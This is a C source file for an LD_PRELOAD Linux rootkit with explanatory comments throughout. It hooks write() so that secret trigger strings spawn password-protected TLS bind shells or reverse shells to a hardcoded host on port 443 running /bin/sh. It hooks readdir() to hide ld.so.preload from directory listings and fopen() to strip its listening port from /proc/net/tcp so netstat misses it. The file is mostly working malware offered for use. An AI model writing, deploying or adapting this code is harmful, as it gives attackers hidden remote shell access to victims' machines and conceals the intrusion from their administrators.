#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
//bind-shell definitions
#define KEY_4 "notavaliduser4"
#define KEY_6 "notavaliduser6"
#define PASS "areallysecurepassword1234!@#$"
#define LOC_PORT 65065
//reverse-shell definitions
#define KEY_R_4 "reverseshell4"
#define KEY_R_6 "reverseshell6"
#define REM_HOST4 "192.168.1.217"
#define REM_HOST6 "::1"
#define REM_PORT 443
//filename to hide
#define FILENAME "ld.so.preload"
//hex represenation of port to hide for /proc/net/tcp reads
#define KEY_PORT "FE29"
//Openssl
#define CERT_FILE "server.crt"
#define KEY_FILE "server.key"


//BIND/REVERSE SHELLCODE
void initialize_openssl() { // prepare the OpenSSL library for use
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() { //...it cleans up 
    EVP_cleanup();
}

SSL_CTX *create_server_context() { //creating and initializing a context; selects protocol;
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_server_method();
    ctx = SSL_CTX_new(method);

    return ctx;
}

SSL_CTX *create_client_context() { //second verse same as the first
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_client_method();
    ctx = SSL_CTX_new(method);

    return ctx;
}

void configure_context(SSL_CTX *ctx) { //configures all protocols and params;
    SSL_CTX_set_ecdh_auto(ctx, 1);
    SSL_CTX_use_certificate_file(ctx, CERT_FILE, SSL_FILETYPE_PEM);
    SSL_CTX_use_PrivateKey_file(ctx, KEY_FILE, SSL_FILETYPE_PEM);
}

int ipv6_bind(void) {
    initialize_openssl();
    SSL_CTX *ctx = create_server_context();
    configure_context(ctx);

    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(LOC_PORT);
    addr.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*)&addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, new_sockfd);
    SSL_accept(ssl);

    for (int count = 0; count < 3; count++) {
        dup2(new_sockfd, count);
    }

    char input[30];
    SSL_read(ssl, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0) {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    } else {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(new_sockfd);
    SSL_CTX_free(ctx);
    cleanup_openssl();
}

int ipv4_bind(void) {
    initialize_openssl();
    SSL_CTX *ctx = create_server_context();
    configure_context(ctx);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOC_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*)&addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, new_sockfd);
    SSL_accept(ssl);

    for (int count = 0; count < 3; count++) {
        dup2(new_sockfd, count);
    }

    char input[30];
    SSL_read(ssl, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0) {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    } else {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(new_sockfd);
    SSL_CTX_free(ctx);
    cleanup_openssl();
}

int ipv6_rev(void) {
    const char* host = REM_HOST6;

    initialize_openssl();
    SSL_CTX *ctx = create_client_context();
    configure_context(ctx);

    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(REM_PORT);
    inet_pton(AF_INET6, host, &addr.sin6_addr);

    struct sockaddr_in6 client;
    client.sin6_family = AF_INET6;
    client.sin6_port = htons(LOC_PORT);
    client.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*)&client, sizeof(client));

    connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);
    SSL_connect(ssl);

    for (int count = 0; count < 3; count++) {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    cleanup_openssl();

    return 0;
}

int ipv4_rev(void) {
    const char* host = REM_HOST4;

    initialize_openssl();
    SSL_CTX *ctx = create_client_context();
    configure_context(ctx);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*)&client, sizeof(client));

    connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);
    SSL_connect(ssl);

    for (int count = 0; count < 3; count++) {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    cleanup_openssl();

    return 0;
}




//HOOK WRITE()
ssize_t write(int fildes, const void *buf, size_t nbytes) //declaration of the real write function
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); //pointer to a function called new_write() with a definition for the function that will eventually be pointed to

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write"); //initializing our pointer; it now will point to the address returned by dlsym which will be the next occurence of the REAL write function


    char *bind4 = strstr(buf, KEY_4); //pointers to our bind/reverse shells if buf from our write call is equal to our defined KEY
    char *bind6 = strstr(buf, KEY_6);
    char *rev4 = strstr(buf, KEY_R_4);
    char *rev6 = strstr(buf, KEY_R_6);

    if (bind4 != NULL) //Following our pointer initialization above; strstr looks for the second arguement in the first; if its 0 it didn't match
                       //use if/else to check if strstr isn't 0 and if its not reroute the write function to dev/nell and execute the given shell
    {                 
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }

    else if (bind6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_bind();
    }

    else if (rev4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else if (rev6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_rev();
    }

    else
    {
        result = new_write(fildes, buf, nbytes); //if nothing matched allow the write function to run normally cuz it isn't us...
    }

    return result;
}



//HIDE FROM LS
struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp)) //while it is true that the legitimate readdir() is still iterating through directory entries and returning a value, do something
    {
        if(strstr(dir->d_name,FILENAME) == 0) break; //compare FILENAME to the d_name and if there is a match break
    }
    return dir;
}


struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp)
{
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *dir;

    while (dir = old_readdir64(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}



//HIDE FROM NETSTAT
FILE *(*orig_fopen64)(const char *pathname, const char *mode); //pointer to the function orig_fopen which has the exact definition of the legitimate fopen() function
FILE *fopen64(const char *pathname, const char *mode) //our hook, this is what the calling program sees and recognizes as the offical definition of fopen()
{
  orig_fopen64 = dlsym(RTLD_NEXT, "fopen64"); //initializing our pointer; points to the next occurence of the fopen64 call

  char *ptr_tcp = strstr(pathname, "/proc/net/tcp"); //we are declaring a pointer that will be initialized if the pathname passed as an argument to fopen() by the calling program has a substring match with "/proc/net/tcp"

  FILE *fp;

  if (ptr_tcp != NULL) // if there is a match do something bout it
  {
    char line[256];
    FILE *temp = tmpfile64(); //we are declaring AND initializing another FILE pointer, this one named temp, which points to a temporary file that lives in /tmp
    fp = orig_fopen64(pathname, mode); //initialize the fp FILE pointer
    while (fgets(line, sizeof(line), fp)) //use fgets() to grap a line of the fp file at a time; 
    {
      char *listener = strstr(line, KEY_PORT); //e are declaring a pointer named listener that will be initialized if there is a substring match between the line we just collected from /proc/net/tcp and KEY_PORT
      if (listener != NULL) //if there isn't a match; do nothing; if there is send the line to our temp folder
      {
        continue;
      }
      else
      {
        fputs(line, temp);
      }
    }
    return temp;
  }

  fp = orig_fopen64(pathname, mode);
  return fp;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
  orig_fopen = dlsym(RTLD_NEXT, "fopen");

  char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

  FILE *fp;

  if (ptr_tcp != NULL)
  {
    char line[256];
    FILE *temp = tmpfile();
    fp = orig_fopen(pathname, mode);
    while (fgets(line, sizeof(line), fp))
    {
      char *listener = strstr(line, KEY_PORT);
      if (listener != NULL)
      {
        continue;
      }
      else
      {
        fputs(line, temp);
      }
    }
    return temp;

  }

  fp = orig_fopen(pathname, mode);
  return fp;
}